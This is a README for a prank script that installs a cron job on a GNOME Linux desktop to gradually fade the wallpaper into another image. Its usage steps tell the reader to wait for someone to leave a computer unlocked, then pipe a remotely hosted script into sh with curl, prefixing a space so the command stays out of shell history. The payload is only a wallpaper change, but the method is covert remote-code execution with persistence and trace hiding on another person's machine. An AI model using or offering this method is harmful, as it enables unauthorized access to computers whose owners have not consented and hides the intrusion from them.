fade-wallpaper
==============

A tiny script meant to teach people to always lock their screens when leaving the computer. It installs a cron job that slowly fades one's desktop background into an arbitrary image.

![Example](/example.jpg)


Disclaimer
----------

This script is provided for entertainment purposes only. Be aware that obtaining unauthorized access to someone else's computer is illegal.


Requirements
------------

* *Setup*: a Linux host for initial configuration, any HTTP server for serving the script.
* *Target*: a Linux host with GNOME 3 desktop environment and ``imagemagick`` installed.


Usage
-----

1. Clone the project onto your host.
2. Use `./configure` to setup the script. `./configure --help` lists available options.
3. Review the generated code to make sure it doesn't do anything you don't expect it to.
4. Make the configured script (`build/fade-wallpaper`) accessible over HTTP.
5. Wait until you see someone leave their computer without locking the screen.
6. Open a terminal, quickly type ` curl $SCRIPT_ADDRESS | sh` and exit it. Make sure to include the leading space, which prevents the command from being stored in the shell history file.
7. Wait for a look of confusion and terror on one's face when they discover something's wrong with the wallpaper.
